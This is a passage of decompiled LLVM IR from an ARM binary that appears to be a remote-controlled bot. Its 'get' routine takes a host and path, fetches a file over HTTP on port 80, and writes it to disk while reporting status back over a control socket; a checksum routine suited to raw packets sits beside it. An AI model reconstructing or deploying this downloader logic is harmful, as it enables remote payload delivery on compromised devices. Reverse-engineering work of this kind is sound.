  %v4_8b20 = call i32 @recv(i32 %v5_89a4, i32 %v2_8b0c, i32 1024, i32 0)
  %tmp34 = icmp slt i32 %v4_8b20, 1
  br i1 %tmp34, label %dec_label_pc_8b44, label %dec_label_pc_8b38

dec_label_pc_8b38:                                ; preds = %dec_label_pc_8b04
  %v7_8b40 = icmp slt i32 %v4_8b20, 20
  br i1 %v7_8b40, label %dec_label_pc_8b4c, label %dec_label_pc_8b44

dec_label_pc_8b44:                                ; preds = %dec_label_pc_8b38, %dec_label_pc_8b04
  %v1_8b48 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8b4c

dec_label_pc_8b4c:                                ; preds = %dec_label_pc_8b38, %dec_label_pc_8b44
  %v2_8b5c = add i32 %v13_88dc, -1084
  %v2_8b60 = add i32 %v2_8b5c, %v4_8b20
  %v3_8b68 = inttoptr i32 %v2_8b60 to i8*
  store i8 0, i8* %v3_8b68, align 1
  %v1_8b70 = add i32 %v13_88dc, -1
  %v2_8b80 = add i32 %v1_8b70, %v4_8b20
  %v2_8b84 = add i32 %v2_8b80, -1084
  %v1_8b88 = inttoptr i32 %v2_8b84 to i8*
  %v2_8b88 = load i8, i8* %v1_8b88, align 1
  %v7_8b8c = icmp eq i8 %v2_8b88, 10
  br i1 %v7_8b8c, label %dec_label_pc_8bbc, label %dec_label_pc_8b94

dec_label_pc_8b94:                                ; preds = %dec_label_pc_8b4c
  %v2_8bb0 = load i8, i8* %v1_8b88, align 1
  %v7_8bb4 = icmp eq i8 %v2_8bb0, 13
  br i1 %v7_8bb4, label %dec_label_pc_8bbc, label %dec_label_pc_8be0

dec_label_pc_8bbc:                                ; preds = %dec_label_pc_8b94, %dec_label_pc_8b4c
  store i8 0, i8* %v1_8b88, align 1
  br label %dec_label_pc_8be0

dec_label_pc_8be0:                                ; preds = %dec_label_pc_8b94, %dec_label_pc_8bbc
  %v1_8be4 = add i32 %v13_88dc, -2
  %v2_8bf4 = add i32 %v1_8be4, %v4_8b20
  %v2_8bf8 = add i32 %v2_8bf4, -1084
  %v1_8bfc = inttoptr i32 %v2_8bf8 to i8*
  %v2_8bfc = load i8, i8* %v1_8bfc, align 1
  %v7_8c00 = icmp eq i8 %v2_8bfc, 10
  br i1 %v7_8c00, label %dec_label_pc_8c30, label %dec_label_pc_8c08

dec_label_pc_8c08:                                ; preds = %dec_label_pc_8be0
  %v2_8c24 = load i8, i8* %v1_8bfc, align 1
  %v7_8c28 = icmp eq i8 %v2_8c24, 13
  br i1 %v7_8c28, label %dec_label_pc_8c30, label %dec_label_pc_8c54

dec_label_pc_8c30:                                ; preds = %dec_label_pc_8c08, %dec_label_pc_8be0
  store i8 0, i8* %v1_8bfc, align 1
  br label %dec_label_pc_8c54

dec_label_pc_8c54:                                ; preds = %dec_label_pc_8c08, %dec_label_pc_8c30
  store i32 %v2_8b0c, i32* @r2, align 4
  %v3_8c78 = call i32 @Send(i32 %v5_89a4, i32 ptrtoint ([25 x i8]* @global_var_36af0.55 to i32))
  %v1_8c80 = call i32 @close(i32 %v5_89a4)
  %v1_8c88 = call i32 @close(i32 %v3_88f4)
  %v1_8c90 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8c94

dec_label_pc_8c94:                                ; preds = %dec_label_pc_897c, %dec_label_pc_8964, %dec_label_pc_890c, %entry, %dec_label_pc_8c54
  %v1_8c9c = phi i32 [ 0, %dec_label_pc_897c ], [ %v2_896c, %dec_label_pc_8964 ], [ %v4_8954, %dec_label_pc_890c ], [ %v3_88f4, %entry ], [ %v1_8c90, %dec_label_pc_8c54 ]
  ret i32 %v1_8c9c

; uselistorder directives
  uselistorder i8* %v1_8bfc, { 1, 0, 2 }
  uselistorder i8* %v1_8b88, { 1, 0, 2 }
  uselistorder i32 %storemerge26, { 1, 0 }
  uselistorder i32* %v1_8ae0, { 2, 0, 1 }
  uselistorder i32 %v1_8a38, { 1, 0 }
  uselistorder i32 %v2_89cc, { 1, 0 }
  uselistorder i32 %v5_89a4, { 2, 3, 4, 1, 0, 6, 5 }
  uselistorder i32 %v2_896c, { 1, 0 }
  uselistorder i32 %v4_8954, { 1, 0 }
  uselistorder i32 %v3_88f4, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v13_88dc, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder label %dec_label_pc_8c94, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8c54, { 1, 0 }
  uselistorder label %dec_label_pc_8be0, { 1, 0 }
  uselistorder label %dec_label_pc_8b4c, { 1, 0 }
  uselistorder label %dec_label_pc_8ac0, { 1, 0 }
  uselistorder label %dec_label_pc_89e0, { 1, 0 }
}

define i32 @poww(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 36020, i32* %stack_var_-4, align 4
  %v2_8cb0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8cb0, i32* @fp, align 4
  %v2_8cc4 = icmp eq i32 %arg2, 0
  br i1 %v2_8cc4, label %dec_label_pc_8ccc, label %dec_label_pc_8cd8

dec_label_pc_8ccc:                                ; preds = %entry
  br label %dec_label_pc_8d14

dec_label_pc_8cd8:                                ; preds = %entry
  %v7_8cdc = icmp eq i32 %arg2, 1
  br i1 %v7_8cdc, label %dec_label_pc_8ce4, label %dec_label_pc_8cf0

dec_label_pc_8ce4:                                ; preds = %dec_label_pc_8cd8
  br label %dec_label_pc_8d14

dec_label_pc_8cf0:                                ; preds = %dec_label_pc_8cd8
  %v1_8cdc = add i32 %arg2, -1
  %v2_8d00 = call i32 @poww(i32 %arg1, i32 %v1_8cdc)
  %v2_8d0c = mul i32 %v2_8d00, %arg1
  br label %dec_label_pc_8d14

dec_label_pc_8d14:                                ; preds = %dec_label_pc_8ce4, %dec_label_pc_8ccc, %dec_label_pc_8cf0
  %stack_var_-28.0 = phi i32 [ 1, %dec_label_pc_8ccc ], [ %arg1, %dec_label_pc_8ce4 ], [ %v2_8d0c, %dec_label_pc_8cf0 ]
  ret i32 %stack_var_-28.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8d14, { 2, 0, 1 }
}

define i32 @in_cksum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v8_8d9811 = icmp sgt i32 %arg2, 1
  br i1 %v8_8d9811, label %dec_label_pc_8d64, label %dec_label_pc_8d9c

dec_label_pc_8d64:                                ; preds = %entry, %dec_label_pc_8d64
  %stack_var_-44.014 = phi i32 [ %v1_8d88, %dec_label_pc_8d64 ], [ %arg2, %entry ]
  %stack_var_-36.013 = phi i32 [ %v2_8d70, %dec_label_pc_8d64 ], [ 0, %entry ]
  %stack_var_-40.012 = phi i16* [ %v5_8d80, %dec_label_pc_8d64 ], [ %arg1, %entry ]
  %v4_8d64 = ptrtoint i16* %stack_var_-40.012 to i32
  %v2_8d68 = load i16, i16* %stack_var_-40.012, align 2
  %v3_8d68 = zext i16 %v2_8d68 to i32
  %v2_8d70 = add i32 %v3_8d68, %stack_var_-36.013
  %v1_8d7c = add i32 %v4_8d64, 2
  %v5_8d80 = inttoptr i32 %v1_8d7c to i16*
  %v1_8d88 = add nsw i32 %stack_var_-44.014, -2
  %v8_8d98 = icmp sgt i32 %v1_8d88, 1
  br i1 %v8_8d98, label %dec_label_pc_8d64, label %dec_label_pc_8d90.dec_label_pc_8d9c_crit_edge

dec_label_pc_8d90.dec_label_pc_8d9c_crit_edge:    ; preds = %dec_label_pc_8d64
  %v7_8d94.le = icmp eq i32 %v1_8d88, 1
  br i1 %v7_8d94.le, label %dec_label_pc_8da8, label %dec_label_pc_8dc8

dec_label_pc_8d9c:                                ; preds = %entry
  %v7_8d9410 = icmp eq i32 %arg2, 1
  br i1 %v7_8d9410, label %dec_label_pc_8da8, label %dec_label_pc_8dc8

dec_label_pc_8da8:                                ; preds = %dec_label_pc_8d90.dec_label_pc_8d9c_crit_edge, %dec_label_pc_8d9c
  %stack_var_-36.0.lcssa30 = phi i32 [ %v2_8d70, %dec_label_pc_8d90.dec_label_pc_8d9c_crit_edge ], [ 0, %dec_label_pc_8d9c ]
  %stack_var_-40.0.lcssa29 = phi i16* [ %v5_8d80, %dec_label_pc_8d90.dec_label_pc_8d9c_crit_edge ], [ %arg1, %dec_label_pc_8d9c ]
  %v1_8db0 = bitcast i16* %stack_var_-40.0.lcssa29 to i8*
  %v2_8db0 = load i8, i8* %v1_8db0, align 1
  %v3_8db0 = zext i8 %v2_8db0 to i32
  %v2_8dc0 = add i32 %v3_8db0, %stack_var_-36.0.lcssa30
  br label %dec_label_pc_8dc8

dec_label_pc_8dc8:                                ; preds = %dec_label_pc_8d90.dec_label_pc_8d9c_crit_edge, %dec_label_pc_8d9c, %dec_label_pc_8da8
  %stack_var_-36.1 = phi i32 [ %v2_8dc0, %dec_label_pc_8da8 ], [ 0, %dec_label_pc_8d9c ], [ %v2_8d70, %dec_label_pc_8d90.dec_label_pc_8d9c_crit_edge ]
  %v3_8dcc = sdiv i32 %stack_var_-36.1, 65536
  %v3_8dd8 = urem i32 %stack_var_-36.1, 65536
  %v2_8ddc = add nsw i32 %v3_8dcc, %v3_8dd8
  %v3_8de8 = sdiv i32 %v2_8ddc, 65536
  %v2_8df0 = add nsw i32 %v3_8de8, %v2_8ddc
  %v1_8e04 = mul i32 %v2_8df0, 65536
  %sext = xor i32 %v1_8e04, -65536
  %v4_8e14 = sdiv i32 %sext, 65536
  ret i32 %v4_8e14

; uselistorder directives
  uselistorder i32 %v2_8ddc, { 1, 0 }
  uselistorder i32 %stack_var_-36.1, { 1, 0 }
  uselistorder i32 %v1_8d88, { 0, 2, 1 }
  uselistorder i32 %v2_8d70, { 1, 0, 2 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8dc8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8da8, { 1, 0 }
  uselistorder label %dec_label_pc_8d64, { 1, 0 }
}

define i32 @get(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-1108 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-5224 = alloca i32, align 4
  %stack_var_-5204 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 36404, i32* %stack_var_-4, align 4
  %v2_8e30 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8e30, i32* @fp, align 4
  %v2_8e44 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8e44, i32* @lr, align 4
  store i32 %arg4, i32* %stack_var_-5224, align 4
  store i32 %v2_8e44, i32* %r1.global-to-local, align 4
  %v1_8e8c = call i32 @mfork(i32 %arg2)
  %v2_8e94 = icmp eq i32 %v1_8e8c, 0
  br i1 %v2_8e94, label %dec_label_pc_8e9c, label %dec_label_pc_9570

dec_label_pc_8e9c:                                ; preds = %entry
  %v8_8eb0 = icmp sgt i32 %arg3, 1
  br i1 %v8_8eb0, label %dec_label_pc_8ee4, label %dec_label_pc_8eb4

dec_label_pc_8eb4:                                ; preds = %dec_label_pc_8e9c
  store i32 ptrtoint ([33 x i8]* @global_var_36b0c.57 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_8e44, i32* @lr, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_8ed8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([33 x i8]* @global_var_36b0c.57 to i32))
  %v1_8ee0 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8ee4

dec_label_pc_8ee4:                                ; preds = %dec_label_pc_8e9c, %dec_label_pc_8eb4
  store i32 1, i32* %r1.global-to-local, align 4
  %v3_8ef0 = call i32 @socket(i32 2, i32 1, i32 0)
  %v3_8f00 = icmp eq i32 %v3_8ef0, -1
  br i1 %v3_8f00, label %dec_label_pc_8f08, label %dec_label_pc_8f38

dec_label_pc_8f08:                                ; preds = %dec_label_pc_8ee4
  store i32 ptrtoint ([37 x i8]* @global_var_36b30.59 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_8f2c = call i32 @Send(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_36b30.59 to i32))
  %v1_8f34 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8f38

dec_label_pc_8f38:                                ; preds = %dec_label_pc_8ee4, %dec_label_pc_8f08
  %v4_8f44 = load i32, i32* %stack_var_-5224, align 4
  %v1_8f48 = add i32 %v4_8f44, 4
  %v1_8f4c = inttoptr i32 %v1_8f48 to i32*
  %v2_8f4c = load i32, i32* %v1_8f4c, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_36b58.61 to i32), i32* @r1, align 4
  %v4_8f5c = inttoptr i32 %v2_8f4c to i8*
  %v5_8f5c = call i32 @__GI_strncmp(i8* %v4_8f5c, i32 ptrtoint ([8 x i8]* @global_var_36b58.61 to i32), i32 7)
  %v2_8f64 = icmp eq i32 %v5_8f5c, 0
  br i1 %v2_8f64, label %dec_label_pc_8f6c, label %dec_label_pc_8fa4

dec_label_pc_8f6c:                                ; preds = %dec_label_pc_8f38
  store i32 %v2_8e44, i32* @lr, align 4
  %v4_8f78 = load i32, i32* %stack_var_-5224, align 4
  %v1_8f7c = add i32 %v4_8f78, 4
  %v1_8f80 = inttoptr i32 %v1_8f7c to i32*
  %v2_8f80 = load i32, i32* %v1_8f80, align 4
  %v1_8f84 = add i32 %v2_8f80, 7
  store i32 %v1_8f84, i32* @r1, align 4
  %v2_8f9c = bitcast i32* %stack_var_-1108 to i8*
  %v3_8f9c = call i32 @strcpy(i8* %v2_8f9c, i32 %v1_8f84)
  br label %dec_label_pc_8fd4

dec_label_pc_8fa4:                                ; preds = %dec_label_pc_8f38
  %v4_8fb0 = load i32, i32* %stack_var_-5224, align 4
  %v1_8fb4 = add i32 %v4_8fb0, 4
  %v1_8fb8 = inttoptr i32 %v1_8fb4 to i32*
  %v2_8fb8 = load i32, i32* %v1_8fb8, align 4
  store i32 %v2_8fb8, i32* @r1, align 4
  %v2_8fd0 = bitcast i32* %stack_var_-1108 to i8*
  %v3_8fd0 = call i32 @strcpy(i8* %v2_8fd0, i32 %v2_8fb8)
  br label %dec_label_pc_8fd4

dec_label_pc_8fd4:                                ; preds = %dec_label_pc_8f6c, %dec_label_pc_8fa4
  %.pre-phi = phi i8* [ %v2_8f9c, %dec_label_pc_8f6c ], [ %v2_8fd0, %dec_label_pc_8fa4 ]
  %v2_8ff8.pre-phi = ptrtoint i32* %stack_var_-1108 to i32
  br label %dec_label_pc_8fec

dec_label_pc_8fe0:                                ; preds = %dec_label_pc_9010
  %v1_8fe4 = add i32 %storemerge5, 1
  br label %dec_label_pc_8fec

dec_label_pc_8fec:                                ; preds = %dec_label_pc_8fd4, %dec_label_pc_8fe0
  %storemerge5 = phi i32 [ 0, %dec_label_pc_8fd4 ], [ %v1_8fe4, %dec_label_pc_8fe0 ]
  store i32 %storemerge5, i32* @r4, align 4
  %v3_9000 = call i32 @strlen(i8* %.pre-phi)
  %v0_9008 = load i32, i32* @r4, align 4
  %v3_9008 = icmp ult i32 %v0_9008, %v3_9000
  br i1 %v3_9008, label %dec_label_pc_9010, label %dec_label_pc_9034

dec_label_pc_9010:                                ; preds = %dec_label_pc_8fec
  store i32 %v2_8e44, i32* %r1.global-to-local, align 4
  %v2_9020 = add i32 %storemerge5, %v2_8e44
  %v2_9024 = add i32 %v2_9020, -1084
  %v1_9028 = inttoptr i32 %v2_9024 to i8*
  %v2_9028 = load i8, i8* %v1_9028, align 1
  %v7_902c = icmp eq i8 %v2_9028, 47
  br i1 %v7_902c, label %dec_label_pc_9034, label %dec_label_pc_8fe0

dec_label_pc_9034:                                ; preds = %dec_label_pc_8fec, %dec_label_pc_9010
  %v2_9044 = add i32 %v2_8e44, -1084
  %v2_9048 = add i32 %v2_9044, %storemerge5
  %v3_9050 = inttoptr i32 %v2_9048 to i8*
  store i8 0, i8* %v3_9050, align 1
  store i32 2, i32* %stack_var_-84, align 4
  %v1_9060 = call i32 @__GI_htons(i32 80)
  store i32 %v2_8ff8.pre-phi, i32* @r0, align 4
  %v1_907c = call i32 @inet_addr(i32 %v2_8ff8.pre-phi)
  %v3_908c = icmp eq i32 %v1_907c, -1
  br i1 %v3_908c, label %dec_label_pc_9094, label %dec_label_pc_9118

dec_label_pc_9094:                                ; preds = %dec_label_pc_9034
  store i32 %v2_8ff8.pre-phi, i32* @r0, align 4
  %v1_90a4 = call i32 @__GI_gethostbyname(i32 %v2_8ff8.pre-phi)
  %v2_90b4 = icmp eq i32 %v1_90a4, 0
  br i1 %v2_90b4, label %dec_label_pc_90bc, label %dec_label_pc_90ec

dec_label_pc_90bc:                                ; preds = %dec_label_pc_9094
  store i32 %v2_8e44, i32* @lr, align 4
  store i32 ptrtoint ([39 x i8]* @global_var_36b60.63 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_90e0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_36b60.63 to i32))
  %v1_90e8 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_90ec

dec_label_pc_90ec:                                ; preds = %dec_label_pc_9094, %dec_label_pc_90bc
  %v1_90f0 = add i32 %v1_90a4, 16
  %v2_90f0 = inttoptr i32 %v1_90f0 to i32*
  %v3_90f0 = load i32, i32* %v2_90f0, align 4
  %v1_90f4 = inttoptr i32 %v3_90f0 to i32*
  %v2_90f4 = load i32, i32* %v1_90f4, align 4
  store i32 %v2_90f4, i32* @r1, align 4
  %v1_90fc = add i32 %v1_90a4, 12
  %v2_90fc = inttoptr i32 %v1_90fc to i32*
  %v3_90fc = load i32, i32* %v2_90fc, align 4
  store i32 %v3_90fc, i32* @r2, align 4
  %v2_9108 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_9108, i32* @r3, align 4
  store i32 %v2_9108, i32* @r0, align 4
  %v0_9110 = call i32 @memcpy()
  br label %dec_label_pc_9120

dec_label_pc_9118:                                ; preds = %dec_label_pc_9034
  store i32 %v1_907c, i32* %stack_var_-80, align 4
  br label %dec_label_pc_9120

dec_label_pc_9120:                                ; preds = %dec_label_pc_90ec, %dec_label_pc_9118
  %v2_9124 = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_9124, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 8, i32* @r2, align 4
  %v0_9134 = call i32 @__GI_memset()
  %v2_9138 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_9138, i32* %r1.global-to-local, align 4
  %v3_9148 = call i32 @connect(i32 %v3_8ef0, i32 %v2_9138, i32 16)
  %v2_9150 = icmp eq i32 %v3_9148, 0
  br i1 %v2_9150, label %dec_label_pc_9188, label %dec_label_pc_9158

dec_label_pc_9158:                                ; preds = %dec_label_pc_9120
  store i32 ptrtoint ([39 x i8]* @global_var_36b88.65 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_8e44, i32* @lr, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_917c = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_36b88.65 to i32))
  %v1_9184 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_9188

dec_label_pc_9188:                                ; preds = %dec_label_pc_9120, %dec_label_pc_9158
  %v2_919c = or i32 %v2_8ff8.pre-phi, 1
  %v1_91a0 = add i32 %v2_919c, %storemerge5
  store i32 %v1_91a0, i32* @r2, align 4
  store i32 ptrtoint ([276 x i8]* @global_var_36bb0.67 to i32), i32* %r1.global-to-local, align 4
  %v3_91b8 = call i32 @Send(i32 %v3_8ef0, i32 ptrtoint ([276 x i8]* @global_var_36bb0.67 to i32))
  store i32 ptrtoint ([28 x i8]* @global_var_36cc4.69 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_91e0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_36cc4.69 to i32))
  %v4_91f0 = load i32, i32* %stack_var_-5224, align 4
  %v1_91f4 = add i32 %v4_91f0, 8
  %v1_91f8 = inttoptr i32 %v1_91f4 to i32*
  %v2_91f8 = load i32, i32* %v1_91f8, align 4
  store i32 %v2_91f8, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_36ce0.71 to i32), i32* @r1, align 4
  %v3_9204 = call i32 @__GI_fopen(i32 %v2_91f8, i32 ptrtoint ([3 x i8]* @global_var_36ce0.71 to i32))
  %v2_9218 = ptrtoint i32* %stack_var_-5204 to i32
  br label %dec_label_pc_9210

dec_label_pc_9210:                                ; preds = %dec_label_pc_93a4, %dec_label_pc_9188
  store i32 %v2_9218, i32* %r1.global-to-local, align 4
  %v4_922c = call i32 @recv(i32 %v3_8ef0, i32 %v2_9218, i32 4096, i32 0)
  %tmp53 = icmp slt i32 %v4_922c, 1
  br i1 %tmp53, label %dec_label_pc_93c4.loopexit9, label %dec_label_pc_9244

dec_label_pc_9244:                                ; preds = %dec_label_pc_9210
  %v8_9254 = icmp sgt i32 %v4_922c, 4095
  br i1 %v8_9254, label %dec_label_pc_9284.lr.ph, label %dec_label_pc_9258

dec_label_pc_9258:                                ; preds = %dec_label_pc_9244
  store i32 %v2_8e44, i32* @lr, align 4
  %v2_926c = add i32 %v4_922c, %v2_9218
  %v3_9274 = inttoptr i32 %v2_926c to i8*
  store i8 0, i8* %v3_9274, align 1
  br label %dec_label_pc_9284.lr.ph

dec_label_pc_9284.lr.ph:                          ; preds = %dec_label_pc_9258, %dec_label_pc_9244
  br label %dec_label_pc_9284

dec_label_pc_9284:                                ; preds = %dec_label_pc_9284.lr.ph, %dec_label_pc_93a4
  %storemerge688 = phi i32 [ 0, %dec_label_pc_9284.lr.ph ], [ %v1_93a8, %dec_label_pc_93a4 ]
  %v2_9298 = add i32 %storemerge688, %v2_9218
  store i32 ptrtoint ([5 x i8]* @global_var_36ce4.73 to i32), i32* @r1, align 4
  %v4_92a8 = inttoptr i32 %v2_9298 to i8*
  %v5_92a8 = call i32 @__GI_strncmp(i8* %v4_92a8, i32 ptrtoint ([5 x i8]* @global_var_36ce4.73 to i32), i32 4)
  %v2_92b0 = icmp eq i32 %v5_92a8, 0
  br i1 %v2_92b0, label %dec_label_pc_92b8, label %dec_label_pc_93a4

dec_label_pc_92b8:                                ; preds = %dec_label_pc_9284
  %v1_92bc = add i32 %storemerge688, 4
  %v1_92d4 = add i32 %v3_9204, 52
  %v2_92d4 = inttoptr i32 %v1_92d4 to i32*
  %v1_92e4 = add i32 %v3_9204, 16
  %v2_92e4 = inttoptr i32 %v1_92e4 to i32*
  %v1_92ec = add i32 %v3_9204, 28
  %v2_92ec = inttoptr i32 %v1_92ec to i32*
  %v5_939c77 = icmp slt i32 %v1_92bc, %v4_922c
  br i1 %v5_939c77, label %dec_label_pc_92c8, label %dec_label_pc_93c4

dec_label_pc_92c8:                                ; preds = %dec_label_pc_92b8, %dec_label_pc_9384
  %storemerge778 = phi i32 [ %v1_9388, %dec_label_pc_9384 ], [ %v1_92bc, %dec_label_pc_92b8 ]
  %v3_92d4 = load i32, i32* %v2_92d4, align 4
  %v2_92d8 = icmp eq i32 %v3_92d4, 0
  br i1 %v2_92d8, label %dec_label_pc_935c, label %dec_label_pc_92e0

dec_label_pc_92e0:                                ; preds = %dec_label_pc_92c8
  %v3_92e4 = load i32, i32* %v2_92e4, align 4
  %v3_92ec = load i32, i32* %v2_92ec, align 4
  %v3_92f0 = icmp ult i32 %v3_92e4, %v3_92ec
  br i1 %v3_92f0, label %dec_label_pc_92f8, label %dec_label_pc_9330

dec_label_pc_92f8:                                ; preds = %dec_label_pc_92e0
  %v3_92fc = load i32, i32* %v2_92e4, align 4
  store i32 %v3_92fc, i32* %r1.global-to-local, align 4
  %v2_9314 = add i32 %storemerge778, %v2_9218
  %v1_9318 = inttoptr i32 %v2_9314 to i8*
  %v2_9318 = load i8, i8* %v1_9318, align 1
  %v3_931c = inttoptr i32 %v3_92fc to i8*
  store i8 %v2_9318, i8* %v3_931c, align 1
  %v0_9320 = load i32, i32* %r1.global-to-local, align 4
  %v1_9320 = add i32 %v0_9320, 1
  store i32 %v1_9320, i32* %v2_92e4, align 4
  br label %dec_label_pc_9384

dec_label_pc_9330:                                ; preds = %dec_label_pc_92e0
  store i32 %v2_8e44, i32* %r1.global-to-local, align 4
  %v2_9344 = add i32 %storemerge778, %v2_9218
  %v1_9348 = inttoptr i32 %v2_9344 to i8*
  %v2_9348 = load i8, i8* %v1_9348, align 1
  store i32 %v3_9204, i32* %r1.global-to-local, align 4
  %v3_9354 = call i32 @putc_unlocked(i8 %v2_9348, i32 %v3_9204)
  br label %dec_label_pc_9384

dec_label_pc_935c:                                ; preds = %dec_label_pc_92c8
  %v2_9370 = add i32 %storemerge778, %v2_9218
  %v1_9374 = inttoptr i32 %v2_9370 to i8*
  %v2_9374 = load i8, i8* %v1_9374, align 1
  %v3_9374 = zext i8 %v2_9374 to i32
  store i32 %v3_9204, i32* %r1.global-to-local, align 4
  %v3_9380 = call i32 @__GI_fputc(i32 %v3_9374, i32 %v3_9204, i32 %storemerge778)
  br label %dec_label_pc_9384

dec_label_pc_9384:                                ; preds = %dec_label_pc_9330, %dec_label_pc_92f8, %dec_label_pc_935c
  %v1_9388 = add i32 %storemerge778, 1
  %v5_939c = icmp slt i32 %v1_9388, %v4_922c
  br i1 %v5_939c, label %dec_label_pc_92c8, label %dec_label_pc_93c4

dec_label_pc_93a4:                                ; preds = %dec_label_pc_9284
  %v1_93a8 = add nuw nsw i32 %storemerge688, 1
  %v5_93bc = icmp slt i32 %v1_93a8, %v4_922c
  br i1 %v5_93bc, label %dec_label_pc_9284, label %dec_label_pc_9210

dec_label_pc_93c4.loopexit9:                      ; preds = %dec_label_pc_9210
  %.pre = add i32 %v3_9204, 52
  %.pre17 = inttoptr i32 %.pre to i32*
  %.pre18 = add i32 %v3_9204, 16
  %.pre19 = inttoptr i32 %.pre18 to i32*
  %.pre20 = add i32 %v3_9204, 28
  %.pre21 = inttoptr i32 %.pre20 to i32*
  br label %dec_label_pc_93c4

dec_label_pc_93c4:                                ; preds = %dec_label_pc_92b8, %dec_label_pc_9384, %dec_label_pc_93c4.loopexit9
  %v2_94a0.pre-phi = phi i32* [ %.pre21, %dec_label_pc_93c4.loopexit9 ], [ %v2_92ec, %dec_label_pc_9384 ], [ %v2_92ec, %dec_label_pc_92b8 ]
  %v2_9498.pre-phi = phi i32* [ %.pre19, %dec_label_pc_93c4.loopexit9 ], [ %v2_92e4, %dec_label_pc_9384 ], [ %v2_92e4, %dec_label_pc_92b8 ]
  %v2_9488.pre-phi = phi i32* [ %.pre17, %dec_label_pc_93c4.loopexit9 ], [ %v2_92d4, %dec_label_pc_9384 ], [ %v2_92d4, %dec_label_pc_92b8 ]
  store i32 %v2_8e44, i32* @lr, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_36cec.75 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_9404 = call i32 @Send(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_36cec.75 to i32))
  br label %dec_label_pc_9408

dec_label_pc_9408:                                ; preds = %dec_label_pc_9538, %dec_label_pc_93c4
  store i32 %v2_9218, i32* %r1.global-to-local, align 4
  %v4_9424 = call i32 @recv(i32 %v3_8ef0, i32 %v2_9218, i32 4096, i32 0)
  %tmp55 = icmp slt i32 %v4_9424, 1
  br i1 %tmp55, label %dec_label_pc_9558, label %dec_label_pc_943c

dec_label_pc_943c:                                ; preds = %dec_label_pc_9408
  %v8_944c = icmp sgt i32 %v4_9424, 4095
  br i1 %v8_944c, label %dec_label_pc_947c.lr.ph, label %dec_label_pc_9450

dec_label_pc_9450:                                ; preds = %dec_label_pc_943c
  %v2_9464 = add i32 %v4_9424, %v2_9218
  %v3_946c = inttoptr i32 %v2_9464 to i8*
  store i8 0, i8* %v3_946c, align 1
  br label %dec_label_pc_947c.lr.ph

dec_label_pc_947c.lr.ph:                          ; preds = %dec_label_pc_9450, %dec_label_pc_943c
  br label %dec_label_pc_947c

dec_label_pc_947c:                                ; preds = %dec_label_pc_947c.lr.ph, %dec_label_pc_9538
  %storemerge868 = phi i32 [ 0, %dec_label_pc_947c.lr.ph ], [ %v1_953c, %dec_label_pc_9538 ]
  %v3_9488 = load i32, i32* %v2_9488.pre-phi, align 4
  %v2_948c = icmp eq i32 %v3_9488, 0
  br i1 %v2_948c, label %dec_label_pc_9510, label %dec_label_pc_9494

dec_label_pc_9494:                                ; preds = %dec_label_pc_947c
  %v3_9498 = load i32, i32* %v2_9498.pre-phi, align 4
  %v3_94a0 = load i32, i32* %v2_94a0.pre-phi, align 4
  %v3_94a4 = icmp ult i32 %v3_9498, %v3_94a0
  br i1 %v3_94a4, label %dec_label_pc_94ac, label %dec_label_pc_94e4

dec_label_pc_94ac:                                ; preds = %dec_label_pc_9494
  %v3_94b0 = load i32, i32* %v2_9498.pre-phi, align 4
  store i32 %v3_94b0, i32* %r1.global-to-local, align 4
  store i32 %v2_8e44, i32* @lr, align 4
  %v2_94c8 = add i32 %storemerge868, %v2_9218
